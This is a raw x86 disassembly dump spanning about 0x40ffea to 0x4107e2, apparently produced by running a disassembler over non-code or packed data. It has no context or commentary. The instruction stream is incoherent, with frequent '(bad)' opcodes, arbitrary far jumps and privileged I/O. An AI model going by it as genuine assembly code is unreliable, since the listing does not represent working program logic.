  40ffea:	imul   ebp,ecx,0x7
  40ffed:	and    al,0x8d
  40ffef:	xchg   ebp,eax
  40fff0:	xchg   esp,eax
  40fff1:	mov    bh,al
  40fff3:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fff5:	neg    ecx
  40fff7:	mov    bh,0x22
  40fff9:	pop    ebx
  40fffa:	or     BYTE PTR [ebp-0xda23c6],ah
  410000:	sub    DWORD PTR [ebx+ecx*4],ebp
  410003:	es in  al,0xfb
  410006:	or     eax,0x84e8717e
  41000b:	arpl   WORD PTR [edx],bx
  41000d:	sbb    BYTE PTR [ecx+0x7150b9c9],ch
  410013:	shl    BYTE PTR [edx+0x7f],cl
  410016:	jmp    0x5c07:0xaa7395af
  41001d:	out    0xb1,al
  41001f:	inc    ebp
  410020:	sahf   
  410021:	mov    esi,0x6a33f17c
  410026:	mov    eax,ds:0xecfcb196
  41002b:	imul   ecx,DWORD PTR [ecx-0x4fbb6418],0x75
  410032:	mov    ecx,0x71bee848
  410037:	ret    0x9a6c
  41003a:	or     eax,DWORD PTR [ebp+0x35]
  41003d:	jp     0x410036
  41003f:	pop    esi
  410040:	fidivr DWORD PTR [esi-0x5a]
  410043:	outs   dx,BYTE PTR ds:[esi]
  410044:	pop    ebx
  410045:	sub    BYTE PTR [ebx],cl
  410047:	fild   WORD PTR [ebx+ecx*8]
  41004a:	or     ch,BYTE PTR ds:0xc0744162
  410050:	outs   dx,BYTE PTR ds:[esi]
  410051:	sbb    bh,ah
  410053:	mov    al,0x68
  410055:	jno    0x410033
  410057:	and    DWORD PTR [ecx+0x56915555],ebx
  41005d:	pushf  
  41005e:	ss (bad) 
  410060:	into   
  410061:	adc    ebp,DWORD PTR [edx+0x69]
  410064:	clc    
  410065:	out    dx,eax
  410066:	pop    ecx
  410067:	mov    ds:0x15470097,eax
  41006c:	dec    ecx
  41006d:	loop   0x410089
  41006f:	(bad)  
  410071:	into   
  410072:	jo     0x41004c
  410074:	popa   
  410075:	xchg   ebp,eax
  410076:	loop   0x41005d
  410078:	call   0xf4d4:0xb17e0e12
  41007f:	xor    al,ah
  410081:	jbe    0x410071
  410083:	xchg   esi,eax
  410084:	mov    esp,0xddd2b9d7
  410089:	outs   dx,BYTE PTR ds:[esi]
  41008a:	fimul  WORD PTR [edx]
  41008c:	push   edx
  41008d:	lds    ecx,FWORD PTR [edx]
  41008f:	popf   
  410090:	sub    esp,DWORD PTR [edx+ecx*4+0x35da6590]
  410097:	imul   ebx,DWORD PTR ss:[ecx-0x7a],0x17
  41009c:	push   es
  41009d:	icebp  
  41009e:	push   0xa
  4100a0:	jo     0x41009b
  4100a2:	fcom   DWORD PTR [eax]
  4100a4:	push   ds
  4100a5:	cmp    ebp,DWORD PTR [ebx-0x41faa861]
  4100ab:	inc    edx
  4100ac:	and    al,0x49
  4100ae:	scas   eax,DWORD PTR es:[edi]
  4100af:	imul   edx,DWORD PTR [edx+0x5],0x75084e02
  4100b6:	popf   
  4100b7:	aaa    
  4100b8:	mov    eax,0x7539fd2b
  4100bd:	test   al,0xd9
  4100bf:	add    eax,0xb9a8d306
  4100c4:	(bad)
  4100c7:	adc    BYTE PTR [edi],bl
  4100c9:	clc    
  4100ca:	nop
  4100cb:	test   al,0xe5
  4100cd:	test   BYTE PTR [ebx+0x635939b2],0x5d
  4100d4:	jle    0x4100f5
  4100d6:	out    0x87,eax
  4100d8:	fimul  WORD PTR [edx+0x5e]
  4100dc:	mov    ah,0xed
  4100de:	xchg   edx,eax
  4100df:	xchg   DWORD PTR [ebp+0x70159cb4],edx
  4100e5:	xchg   esi,eax
  4100e6:	lea    ebp,[ebx-0x74ebf8e3]
  4100ec:	out    dx,al
  4100ed:	sub    BYTE PTR [ecx],al
  4100ef:	stos   DWORD PTR es:[edi],eax
  4100f0:	rcl    BYTE PTR [ecx],0xc6
  4100f3:	test   al,0x2e
  4100f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100f6:	stc    
  4100f7:	outs   dx,BYTE PTR ds:[esi]
  4100f8:	jae    0x4100f1
  4100fa:	dec    eax
  4100fb:	xlat   BYTE PTR ds:[ebx]
  4100fc:	arpl   bp,ax
  4100fe:	sub    esi,edx
  410100:	add    bh,BYTE PTR [edx+0x4a]
  410103:	aas    
  410104:	adc    ecx,DWORD PTR [eax-0x67f9af69]
  41010a:	int3   
  41010b:	sbb    dl,al
  41010d:	clc    
  41010e:	jle    0x410182
  410110:	add    BYTE PTR [edx+0x68],bl
  410113:	shl    DWORD PTR [edi-0x609cd650],0xfc
  41011a:	lds    edx,FWORD PTR [ebx+0x16848ee3]
  410120:	mov    BYTE PTR [edi],ah
  410122:	das    
  410123:	addr16 into 
  410125:	imul   esi
  410127:	push   ss
  410128:	sbb    BYTE PTR [ebx-0x5e57f240],dh
  41012e:	rol    DWORD PTR [edi],0x6
  410131:	and    BYTE PTR [eax],al
  410133:	mov    ds:0x813c46d6,al
  410138:	push   0x45
  41013a:	or     BYTE PTR [edx],ah
  41013c:	ret    0xfbad
  41013f:	sahf   
  410140:	ins    DWORD PTR es:[edi],dx
  410141:	loopne 0x410181
  410143:	fadd   st(4),st
  410145:	ja     0x410174
  410147:	scas   al,BYTE PTR es:[edi]
  410148:	jecxz  0x410161
  41014a:	xor    DWORD PTR [ebx-0x419d5f04],edx
  410150:	cmp    DWORD PTR ds:0x9560b8e0,edi
  410156:	sub    eax,0xc9198da9
  41015b:	jg     0x410100
  41015d:	pop    eax
  41015e:	fld    TBYTE PTR [eax-0x36bfd9b1]
  410164:	adc    DWORD PTR [edx],eax
  410166:	xchg   ebp,eax
  410167:	pushw  ds
  410169:	addr16 jle 0x4101d4
  41016c:	dec    ebx
  41016d:	pop    ebp
  41016e:	inc    ebp
  41016f:	or     eax,0xa6dd9e2c
  410174:	dec    ebp
  410175:	mov    edi,0x6f038fa3
  41017a:	mov    WORD PTR [esi+eiz*1],fs
  41017d:	or     cl,BYTE PTR [ebp+0x787be6e6]
  410183:	jle    0x4101d5
  410185:	jp     0x4101d1
  410187:	ror    BYTE PTR [ebx],1
  410189:	mov    eax,ds:0x11ba9892
  41018e:	adc    al,0x31
  410190:	leave  
  410191:	es in  al,dx
  410193:	nop
  410194:	sbb    esi,DWORD PTR [edi]
  410196:	or     esi,eax
  410198:	shr    BYTE PTR [eax],1
  41019a:	adc    dl,BYTE PTR [edx-0x2e9bde52]
  4101a0:	pop    edi
  4101a1:	sbb    ch,BYTE PTR [edx-0x4f]
  4101a4:	push   0xbc684fe3
  4101a9:	int3   
  4101aa:	jne    0x410130
  4101ac:	push   cs
  4101ad:	sub    ebx,DWORD PTR [edx-0x2f]
  4101b0:	add    ch,BYTE PTR [esi-0x11]
  4101b3:	fnsave [ebp-0x37f9990f]
  4101b9:	sar    DWORD PTR [edx-0x55],cl
  4101bc:	ret    0x3e39
  4101bf:	fs shr bh,cl
  4101c2:	push   ebx
  4101c3:	xor    bh,BYTE PTR [esp+ebx*2+0x15caf256]
  4101ca:	sti    
  4101cb:	pusha  
  4101cc:	inc    ebp
  4101cd:	inc    ebp
  4101ce:	fisubr WORD PTR [ebp-0x4117d6b8]
  4101d4:	adc    ebp,ebx
  4101d6:	mov    ds:0x13af1d50,eax
  4101db:	daa    
  4101dc:	xchg   esp,eax
  4101dd:	sub    eax,0xa0431cc7
  4101e2:	(bad)  
  4101e3:	pop    esi
  4101e4:	push   esi
  4101e5:	sbb    al,0xa6
  4101e7:	mov    esi,0x657b423c
  4101ec:	sub    esi,DWORD PTR ds:0xc0884a34
  4101f2:	pop    ebp
  4101f3:	sbb    DWORD PTR [edi+0x3b],eax
  4101f6:	aad    0x5e
  4101f8:	mov    ch,0x89
  4101fa:	cmp    BYTE PTR [esi-0x28d75488],ch
  410200:	jmp    0xfb12:0x51202082
  410207:	and    eax,0x83243219
  41020c:	ret    0x6378
  41020f:	jl     0x410218
  410211:	or     DWORD PTR [edx-0x463b903b],edx
  410217:	or     ebp,DWORD PTR [ecx+0x66]
  41021a:	and    BYTE PTR [eax],0x7b
  41021d:	xor    al,0xb3
  41021f:	mov    bl,0x9c
  410221:	sub    BYTE PTR [esi],0x55
  410224:	shl    BYTE PTR [edi+edx*2],cl
  410227:	in     eax,dx
  410228:	fsubr  DWORD PTR [ebp-0x3aebda5b]
  41022e:	inc    esi
  41022f:	sub    eax,ecx
  410231:	cmp    al,0x58
  410233:	and    BYTE PTR [ebx-0x6715d920],ch
  410239:	in     al,dx
  41023a:	mov    DWORD PTR [eax-0x5420d68b],0x8eb33ed8
  410244:	push   cs
  410245:	push   edi
  410246:	ja     0x410263
  410248:	add    al,cl
  41024a:	inc    ecx
  41024b:	sbb    DWORD PTR [ebx-0x16],esp
  41024e:	push   ebp
  41024f:	add    DWORD PTR [ecx-0x13ed4c94],edi
  410255:	sbb    al,0x6a
  410257:	pop    ebx
  410258:	jns    0x410218
  41025a:	cmp    eax,0xf5b8df5a
  41025f:	ja     0x41020f
  410261:	inc    edi
  410262:	icebp  
  410263:	loope  0x4102d1
  410265:	cs push esi
  410267:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410268:	aaa    
  410269:	stos   BYTE PTR es:[edi],al
  41026a:	dec    DWORD PTR [esi]
  41026c:	jne    0x41028e
  41026e:	scas   al,BYTE PTR es:[edi]
  41026f:	ficom  WORD PTR [edi+0x19]
  410272:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410273:	pop    eax
  410274:	jns    0x4101fd
  410276:	loop   0x41025a
  410278:	sub    al,0x95
  41027a:	into   
  41027b:	clc    
  41027c:	cmp    eax,0x753fe2ee
  410281:	nop
  410282:	ss call 0xe3d5954b
  410288:	inc    esi
  410289:	adc    al,0xd5
  41028b:	jmp    0xf30cb254
  410290:	and    ch,BYTE PTR [edx+0x5]
  410293:	or     dl,dl
  410295:	sar    ecx,cl
  410297:	pushf  
  410298:	es inc ecx
  41029a:	dec    eax
  41029b:	mov    es,WORD PTR ds:0xcaa23c08
  4102a1:	mov    BYTE PTR cs:[eax+0x48],ah
  4102a5:	lods   al,BYTE PTR ds:[esi]
  4102a6:	cwde   
  4102a7:	add    dl,bl
  4102a9:	adc    DWORD PTR [eax+0x53],eax
  4102ac:	rol    dl,0x54
  4102af:	out    0x6e,eax
  4102b1:	loop   0x41026a
  4102b3:	repnz das 
  4102b5:	dec    edi
  4102b6:	mov    edx,0x386105f6
  4102bb:	pop    edi
  4102bc:	jmp    0x2d73:0x331fdaf4
  4102c3:	out    0x4,eax
  4102c5:	loopne 0x410267
  4102c7:	push   eax
  4102c8:	aas    
  4102c9:	dec    ebx
  4102ca:	mov    al,0x72
  4102cc:	and    BYTE PTR [edx],ch
  4102ce:	or     cl,BYTE PTR gs:[ebx+0x7d]
  4102d2:	pop    ss
  4102d3:	or     al,0x68
  4102d5:	ficomp DWORD PTR [ecx]
  4102d7:	in     al,0xd5
  4102d9:	in     eax,dx
  4102da:	inc    esp
  4102db:	call   0xe136:0x7b70de7f
  4102e2:	dec    ebx
  4102e3:	gs push eax
  4102e5:	rcl    edi,cl
  4102e7:	mov    ds:0x653a3a64,al
  4102ec:	outs   dx,DWORD PTR ds:[esi]
  4102ed:	pop    edx
  4102ee:	pop    edi
  4102ef:	arpl   di,sp
  4102f1:	sbb    al,0xf4
  4102f3:	jle    0x4102a9
  4102f5:	add    cl,BYTE PTR [esi]
  4102f7:	loope  0x4102f3
  4102f9:	ja     0x41032e
  4102fb:	cld    
  4102fc:	shr    DWORD PTR [ecx+0x5e],0x66
  410300:	shl    BYTE PTR [ebx-0xc2eff82],0x41
  410307:	or     eax,0x7053d359
  41030c:	xor    BYTE PTR [edx],cl
  41030e:	retf   
  41030f:	lds    ecx,FWORD PTR [edx+0x39]
  410312:	dec    ebp
  410313:	cdq    
  410314:	nop
  410315:	xlat   BYTE PTR ds:[ebx]
  410316:	xchg   edx,eax
  410317:	jge    0x410345
  410319:	add    BYTE PTR [esi+0x1d],dh
  41031c:	mov    ecx,ds
  41031e:	xlat   BYTE PTR ds:[ebx]
  41031f:	mov    cl,0x72
  410321:	cmp    DWORD PTR [ebx+0x1c],eax
  410324:	jmp    edi
  410326:	(bad)  
  410328:	mov    WORD PTR [edi-0x17b8c26e],?
  41032e:	lahf   
  41032f:	(bad)  
  410330:	ins    DWORD PTR es:[edi],dx
  410331:	dec    eax
  410332:	mov    dh,0x4a
  410334:	(bad)  
  410336:	fcom   DWORD PTR [ecx+0x12107075]
  41033c:	push   esi
  41033d:	fist   DWORD PTR [ebp-0x73]
  410340:	dec    esi
  410341:	fild   DWORD PTR ds:0x7afc17a3
  410347:	daa    
  410348:	mov    ebp,cs
  41034a:	cld    
  41034b:	push   ds
  41034c:	push   esi
  41034d:	mov    ch,0x81
  41034f:	mov    cl,0x39
  410351:	bound  ebp,QWORD PTR [edi]
  410353:	and    edx,0x3d
  410356:	sbb    cl,BYTE PTR [esi-0x11ba8f15]
  41035c:	rcl    BYTE PTR [edi],cl
  41035e:	sub    al,0x99
  410360:	dec    esi
  410361:	xchg   al,ch
  410363:	pop    ebx
  410364:	loopne 0x410333
  410366:	push   eax
  410367:	shr    BYTE PTR [ebp+0x2d1e5fc4],0xb5
  41036e:	mul    ecx
  410370:	add    DWORD PTR [eax+edx*4-0x70],ebx
  410374:	mov    edi,0xfe6e40d1
  410379:	js     0x4103f6
  41037b:	push   ss
  41037c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41037d:	dec    esp
  41037e:	scas   eax,DWORD PTR es:[edi]
  41037f:	imul   ebx,ebp,0xffffff81
  410382:	push   0xffffffbb
  410384:	sub    BYTE PTR [ebp+0xf98f295],dl
  41038a:	mov    edi,0x21556c98
  41038f:	mov    esp,0x6f7e96cc
  410394:	fld    DWORD PTR [esi+0x2e747b4]
  41039a:	adc    al,0x69
  41039c:	jo     0x410320
  41039e:	add    DWORD PTR [esi+0x23cc846d],esi
  4103a4:	sub    bh,ah
  4103a6:	or     BYTE PTR [ebx+ebx*8+0x44e96347],cl
  4103ad:	(bad)  
  4103ae:	dec    ebp
  4103af:	mov    ds:0x7930cfdf,al
  4103b4:	jae    0x410403
  4103b6:	push   ebx
  4103b7:	ins    DWORD PTR es:[edi],dx
  4103b8:	rol    bl,cl
  4103ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103bb:	cmp    al,0xcc
  4103bd:	and    edi,0x4bab591f
  4103c3:	sbb    al,dh
  4103c5:	xchg   esi,eax
  4103c6:	lock xor DWORD PTR [edi-0x1449cf2b],esi
  4103cd:	mov    edx,0x52ac8338
  4103d2:	adc    DWORD PTR [esi],edx
  4103d4:	push   es
  4103d5:	xchg   esp,eax
  4103d6:	mov    esi,ebp
  4103d8:	and    al,0x8b
  4103da:	imul   BYTE PTR ds:0xab4eb9f6
  4103e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103e1:	adc    eax,0x47955ad9
  4103e6:	out    0xce,eax
  4103e8:	fcom   QWORD PTR [ebx+0x3c]
  4103eb:	icebp  
  4103ec:	cmp    DWORD PTR [ebp+0x359c40ec],edx
  4103f2:	xor    al,0x3f
  4103f4:	push   es
  4103f5:	sbb    eax,ecx
  4103f7:	dec    edi
  4103f8:	adc    cl,cl
  4103fa:	pop    esp
  4103fb:	iret   
  4103fc:	xchg   ebx,eax
  4103fd:	mov    ebx,DWORD PTR [ebx]
  4103ff:	adc    eax,0xb49ef682
  410404:	cs je  0x4103c1
  410407:	pop    esi
  410408:	jb     0x410423
  41040a:	repnz xor al,ch
  41040d:	or     al,0x4d
  41040f:	jecxz  0x4103c2
  410411:	sub    eax,0x6c15c3d0
  410416:	jmp    0x4103b3
  410418:	stos   DWORD PTR es:[edi],eax
  410419:	fstp   QWORD PTR [esi]
  41041b:	or     ecx,esi
  41041d:	fidivr WORD PTR [ecx-0x5c112881]
  410423:	mov    edx,0x1bc7fa8b
  410428:	(bad)  
  410429:	xchg   ebx,eax
  41042a:	push   edx
  41042b:	call   0x3e3d:0x3a8cd6c3
  410432:	jg     0x410406
  410434:	jmp    0x4103c9
  410436:	das    
  410437:	retf   0x942
  41043a:	cli    
  41043b:	not    DWORD PTR [ebx+0x3e]
  41043e:	cdq    
  41043f:	mov    eax,ds:0xe2a395c3
  410444:	cmp    bl,BYTE PTR [ecx-0x6209a30]
  41044a:	call   0xd44f:0xfb177a9c
  410451:	adc    al,0x5
  410453:	lods   al,BYTE PTR ds:[esi]
  410454:	loop   0x4103f8
  410456:	push   ecx
  410457:	ss push ebx
  410459:	mov    esp,0x7e09aadd
  41045e:	inc    ebx
  41045f:	sub    ebx,DWORD PTR [edx+ebx*4-0x37ee349d]
  410466:	aaa    
  410467:	test   bh,dl
  410469:	cmp    BYTE PTR [ebp+ebx*1+0x11974d35],dh
  410470:	jbe    0x410438
  410472:	sbb    eax,0xf45d60f2
  410477:	mov    bh,ah
  410479:	fldenv [ecx-0x60]
  41047c:	cmc    
  41047d:	dec    edi
  41047e:	xor    edx,ecx
  410480:	jg     0x4104e8
  410482:	imul   esi,DWORD PTR [edi+0x36cc1db3],0x3e
  410489:	mov    WORD PTR [edx+0x52431cdd],es
  41048f:	xlat   BYTE PTR ds:[ebx]
  410490:	js     0x41046c
  410492:	arpl   WORD PTR [edi-0x61],sp
  410495:	jp     0x41043c
  410497:	xchg   BYTE PTR [edi+0x1bc83d2a],bl
  41049d:	mov    eax,DWORD PTR [edx]
  41049f:	jo     0x4104f9
  4104a1:	cdq    
  4104a2:	pop    edx
  4104a3:	int3   
  4104a4:	pop    esi
  4104a5:	rcl    esi,1
  4104a7:	lahf   
  4104a8:	sahf   
  4104a9:	int3   
  4104aa:	fild   QWORD PTR [esi+0x1d]
  4104ad:	clc    
  4104ae:	pop    ebp
  4104af:	sub    ecx,ebx
  4104b1:	in     eax,0x33
  4104b3:	jne    0x41052d
  4104b5:	(bad)  
  4104b6:	mov    bh,0x50
  4104b8:	repz arpl dx,bp
  4104bb:	pop    ecx
  4104bc:	mov    ch,0xb4
  4104be:	sub    eax,0x408d0341
  4104c3:	dec    edx
  4104c4:	fisub  WORD PTR [eax]
  4104c6:	and    BYTE PTR ds:0x6fd5c099,dh
  4104cc:	sbb    ebx,DWORD PTR [edx+0x47]
  4104cf:	add    DWORD PTR [edi-0x77438f16],edi
  4104d5:	jb     0x410512
  4104d7:	add    DWORD PTR [edi+edi*8],0x59aac22f
  4104de:	jl     0x41054b
  4104e0:	cs dec eax
  4104e2:	nop
  4104e3:	sub    DWORD PTR ds:0x88fd4040,esi
  4104e9:	out    dx,al
  4104ea:	lods   al,BYTE PTR ds:[esi]
  4104eb:	fcmovu st,st(7)
  4104ed:	ds sub ecx,0x89b020
  4104f4:	pop    ebp
  4104f5:	adc    esi,ebp
  4104f7:	adc    ah,BYTE PTR [ecx-0x2461a955]
  4104fd:	bound  esi,QWORD PTR [edi+0x3871e8d1]
  410503:	dec    edi
  410504:	in     al,0xb4
  410506:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410507:	jns    0x410501
  410509:	pop    es
  41050a:	xor    eax,0xe4a292b5
  41050f:	fistp  QWORD PTR [ecx+edx*4-0x3]
  410513:	and    ch,BYTE PTR [edi-0x39]
  410516:	xor    al,0xa4
  410518:	jns    0x410514
  41051a:	fstp   TBYTE PTR [eax]
  41051c:	cmp    DWORD PTR ds:0xdea1d659,eax
  410522:	fist   WORD PTR [ebx+0x19d49300]
  410528:	xchg   ebp,eax
  410529:	bnd ret 
  41052b:	xchg   esi,eax
  41052c:	adc    DWORD PTR [edx+ebp*2-0x39],esp
  410530:	aam    0x9b
  410532:	adc    DWORD PTR [edx+0x607aa6a5],edx
  410538:	fs add eax,0x488bc01a
  41053e:	dec    eax
  41053f:	mov    bl,0xec
  410541:	mov    ah,0x46
  410543:	sbb    BYTE PTR ds:0x7a5c5cdc,dh
  410549:	adc    al,0x4c
  41054b:	call   0xb100:0x5b696c8b
  410552:	in     eax,dx
  410553:	jns    0x41053e
  410555:	add    ebx,ecx
  410557:	push   eax
  410558:	aam    0x5c
  41055a:	imul   eax,DWORD PTR [ebx+0x661e7a93],0xffffffae
  410561:	sbb    eax,0xdc25907a
  410566:	jne    0x41058f
  410568:	mov    esi,0x36c95748
  41056d:	sub    edx,DWORD PTR [edx]
  41056f:	in     eax,dx
  410570:	adc    BYTE PTR [eax],dh
  410572:	xchg   ebp,eax
  410573:	shl    BYTE PTR [ecx-0x22],cl
  410576:	inc    edx
  410577:	repnz repz dec edi
  41057a:	and    al,0x8d
  41057c:	pop    ss
  41057d:	mov    ah,0xe
  41057f:	loopne 0x4105f0
  410581:	mov    bl,0x2f
  410583:	stc    
  410584:	push   0x64b0faad
  410589:	sub    DWORD PTR [edx+0x2465748d],edi
  41058f:	das    
  410590:	dec    ecx
  410591:	imul   esi,DWORD PTR [eax+0x3a206f53],0x5f737a43
  41059b:	sbb    BYTE PTR [eax-0x3d],0x10
  41059f:	xor    bh,bl
  4105a1:	jl     0x4105c1
  4105a3:	cwd    
  4105a5:	outs   dx,BYTE PTR ds:[esi]
  4105a6:	cwde   
  4105a7:	pop    ebx
  4105a8:	fdivr  DWORD PTR ss:[ecx-0x3f3a4649]
  4105af:	or     ah,dh
  4105b1:	xor    ebp,eax
  4105b3:	aas    
  4105b4:	ds (bad) 
  4105b6:	(bad)  
  4105b8:	shl    DWORD PTR [edx+0x2e24c787],0xcd
  4105bf:	jmp    DWORD PTR [eax-0x1]
  4105c2:	outs   dx,BYTE PTR ds:[esi]
  4105c3:	pop    esi
  4105c4:	mov    al,ds:0x4a98ca0c
  4105c9:	(bad)
  4105ce:	in     eax,dx
  4105cf:	in     eax,dx
  4105d0:	fisub  DWORD PTR [edx+0x79]
  4105d3:	sahf   
  4105d4:	jns    0x410561
  4105d6:	pop    eax
  4105d7:	pop    es
  4105d8:	sub    al,0x45
  4105da:	jg     0x41063f
  4105dc:	jbe    0x41064a
  4105de:	push   ds
  4105df:	stos   DWORD PTR es:[edi],eax
  4105e0:	adc    eax,0x5e9a8369
  4105e5:	(bad)  
  4105e9:	mov    BYTE PTR [edi-0x61],dl
  4105ec:	jp     0x410602
  4105ee:	add    eax,0xe7e24aab
  4105f3:	clc    
  4105f4:	inc    edi
  4105f5:	dec    edi
  4105f6:	adc    BYTE PTR [ebx],bl
  4105f8:	or     ecx,DWORD PTR [ecx+esi*2]
  4105fb:	ds mov edx,esp
  4105fe:	xor    DWORD PTR ds:0x6a379a57,esp
  410604:	in     eax,0xb9
  410606:	(bad)  
  410608:	add    al,0xee
  41060a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41060b:	mov    ds:0x7bef0010,al
  410610:	mov    ch,BYTE PTR [eax]
  410612:	jnp    0x410653
  410614:	out    0xf8,eax
  410616:	mov    fs,edi
  410618:	test   DWORD PTR [ecx+edi*2+0x6b],esi
  41061c:	arpl   WORD PTR [ebx+0x16f5eebc],di
  410622:	leave  
  410623:	mov    eax,0x77a2a34c
  410628:	enter  0x34f1,0xe8
  41062c:	cmp    DWORD PTR [edx],eax
  41062e:	int    0xb2
  410630:	mov    ds:0x7d68b7fe,eax
  410635:	inc    esi
  410636:	lods   al,BYTE PTR ds:[esi]
  410637:	jne    0x410627
  410639:	ret    
  41063a:	and    al,dh
  41063c:	mov    ebp,0x878e7519
  410641:	fldcw  WORD PTR [esi+ecx*4+0xcf8d973]
  410648:	mov    esp,0x9668256c
  41064d:	das    
  41064e:	or     dh,BYTE PTR [edx]
  410650:	ret    0x73f3
  410653:	mov    esp,0x9aba05f3
  410658:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410659:	mov    BYTE PTR [ebp+0x20],dl
  41065c:	adc    eax,0x1167cdf
  410661:	mov    ch,0x77
  410663:	pushf  
  410664:	mov    ?,ecx
  410666:	push   ebp
  410667:	mov    ebx,0xed2714f8
  41066c:	aaa    
  41066d:	in     al,dx
  41066e:	out    0xfb,al
  410670:	dec    BYTE PTR [eax-0x12cbc857]
  410676:	push   0x3e
  410678:	add    eax,0x890348b7
  41067d:	retf   
  41067e:	mov    bl,0xd
  410680:	(bad)  
  410681:	adc    DWORD PTR [ebx],ebx
  410683:	xadd   ah,dl
  410686:	data16 fwait
  410688:	mov    bh,0xf4
  41068a:	pop    ecx
  41068b:	ja     0x41067d
  41068d:	mov    ebp,0xfa49455f
  410692:	fisttp QWORD PTR [ebp+edx*2+0x56e5f094]
  410699:	imul   edi,esi,0x25
  41069c:	rol    BYTE PTR [edi+0x15],0x14
  4106a0:	rol    BYTE PTR [ecx-0x64],cl
  4106a3:	fwait
  4106a4:	mov    ah,0x51
  4106a6:	ud0    ecx,ebp
  4106a9:	(bad)  
  4106aa:	fistp  QWORD PTR [esi-0x4b]
  4106ad:	add    eax,0xf6ca16cc
  4106b2:	xor    bl,bh
  4106b4:	jl     0x4106f8
  4106b6:	cwde   
  4106b7:	mov    esi,0xf8437f59
  4106bc:	jae    0x4106d5
  4106be:	xchg   ebp,eax
  4106bf:	stc    
  4106c0:	in     eax,0x72
  4106c2:	nop
  4106c3:	pusha  
  4106c4:	adc    DWORD PTR [ebx],ebx
  4106c6:	pop    esi
  4106c7:	(bad)  
  4106c8:	std    
  4106c9:	sbb    eax,0x677d432d
  4106ce:	jb     0x41066b
  4106d0:	fnstcw WORD PTR [esi]
  4106d2:	cwde   
  4106d3:	cmp    bl,bh
  4106d5:	xor    esp,DWORD PTR [eax]
  4106d7:	pushw  0x1c38
  4106db:	es cwde 
  4106dd:	mov    ebx,0xa9e76a57
  4106e2:	xchg   esp,eax
  4106e3:	icebp  
  4106e4:	jae    0x41072e
  4106e6:	adc    al,BYTE PTR [ecx-0x6695ee87]
  4106ec:	add    DWORD PTR [edx],eax
  4106ee:	pop    ss
  4106ef:	call   0xc55f07cf
  4106f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106f5:	inc    edi
  4106f6:	dec    edi
  4106f7:	daa    
  4106f8:	test   BYTE PTR [ebp+0xaafc6a7],dl
  4106fe:	lds    edi,FWORD PTR [esi+ebx*8-0x39d12b92]
  410705:	loop   0x4106a3
  410707:	jmp    0x41070d
  410709:	pushf  
  41070a:	jp     0x410752
  41070c:	loopne 0x410740
  41070e:	das    
  41070f:	je     0x410738
  410711:	cmp    BYTE PTR [esi+0x38],dl
  410714:	js     0x410785
  410716:	imul   esi,DWORD PTR [eax-0x5db8104b],0x22
  41071d:	inc    eax
  41071e:	mov    edi,DWORD PTR [eax]
  410720:	out    0xf7,eax
  410722:	out    dx,eax
  410723:	or     DWORD PTR [ecx+0x175746ba],0x1274a24d
  41072d:	cld    
  41072e:	(bad)  
  41072f:	popa   
  410730:	mov    al,BYTE PTR [esi-0x66a804e1]
  410736:	inc    ebx
  410737:	mov    eax,ds:0x19ae0766
  41073c:	cli    
  41073d:	aaa    
  41073e:	jg     0x41074f
  410740:	push   ds
  410741:	pushf  
  410742:	loop   0x4107ac
  410744:	add    DWORD PTR [ebp+0x38],ebp
  410747:	retf   
  410748:	add    edx,DWORD PTR [ecx-0x78ca078]
  41074e:	and    eax,0x27b5765a
  410753:	push   esp
  410754:	pop    ecx
  410755:	inc    edi
  410756:	sti    
  410757:	ins    BYTE PTR es:[edi],dx
  410758:	(bad)  
  410759:	in     al,dx
  41075a:	(bad)  
  41075b:	jbe    0x410718
  41075d:	imul   BYTE PTR [ebx]
  41075f:	or     BYTE PTR [eax+0x29013c34],dl
  410765:	loop   0x4107a1
  410767:	stos   BYTE PTR es:[edi],al
  410768:	adc    DWORD PTR [ebp+eiz*2-0x29],0xffffffa2
  41076d:	jl     0x410729
  41076f:	jne    0x4107e0
  410771:	out    dx,eax
  410772:	inc    ebp
  410773:	jmp    DWORD PTR [ebx-0x40]
  410776:	sub    DWORD PTR gs:[ebp+edi*4-0x1e],ebx
  41077b:	ins    DWORD PTR es:[edi],dx
  41077c:	mov    esp,ebp
  41077e:	and    ah,dl
  410780:	or     BYTE PTR [edx+eax*4],0xb5
  410784:	ja     0x4107ad
  410786:	jb     0x4107b9
  410788:	aaa    
  410789:	jno    0x410750
  41078b:	inc    eax
  41078c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41078d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41078e:	popa   
  41078f:	nop
  410790:	fs ins BYTE PTR es:[edi],dx
  410792:	(bad)  
  410793:	cdq    
  410794:	imul   BYTE PTR ds:0x6a191733
  41079a:	pop    esp
  41079b:	xor    dh,BYTE PTR [ecx]
  41079d:	scas   eax,DWORD PTR es:[edi]
  41079e:	lea    edi,[eax+0x6b]
  4107a1:	add    al,BYTE PTR [ebx-0x26cd9f8b]
  4107a7:	jae    0x4107cb
  4107a9:	sbb    ebx,DWORD PTR [ecx-0x425547e5]
  4107af:	int3   
  4107b0:	xlat   BYTE PTR ds:[ebx]
  4107b1:	ret    
  4107b2:	outs   dx,BYTE PTR ds:[esi]
  4107b3:	dec    edx
  4107b4:	dec    edx
  4107b5:	mov    edi,0x493cf3c5
  4107ba:	push   ecx
  4107bb:	jge    0x410833
  4107bd:	xor    BYTE PTR es:[esi],0x9f
  4107c1:	push   esi
  4107c2:	loop   0x4107fb
  4107c4:	mov    bh,0xce
  4107c6:	or     bl,BYTE PTR [ecx+0x7c]
  4107c9:	push   ss
  4107ca:	jo     0x4107b6
  4107cc:	adc    esi,ecx
  4107ce:	ins    DWORD PTR es:[edi],dx
  4107cf:	jo     0x41075f
  4107d1:	inc    esp
  4107d2:	add    al,0x9d
  4107d4:	push   0x218a1a46
  4107d9:	gs inc esp
  4107db:	xchg   edi,eax
  4107dc:	cmp    DWORD PTR [edx+0x1869bf22],eax
  4107e2:	std    
